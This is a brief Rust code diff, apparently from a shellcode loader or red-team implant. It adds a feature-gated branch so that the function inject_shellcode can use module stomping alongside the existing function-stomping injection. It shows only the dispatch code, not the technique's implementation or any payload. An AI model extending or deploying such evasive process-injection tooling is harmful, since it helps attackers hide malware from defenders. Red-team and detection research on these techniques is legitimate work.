@@ -46,6 +46,12 @@ fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
         use super::injection::inject_function_stomping;
         inject_function_stomping(bytes_to_load)
     }
+    
+    #[cfg(feature = "InjectionModuleStomping")]
+    {
+        use super::injection::inject_module_stomping;
+        inject_module_stomping(bytes_to_load)
+    }
 }
 
 // =======================================================================================================
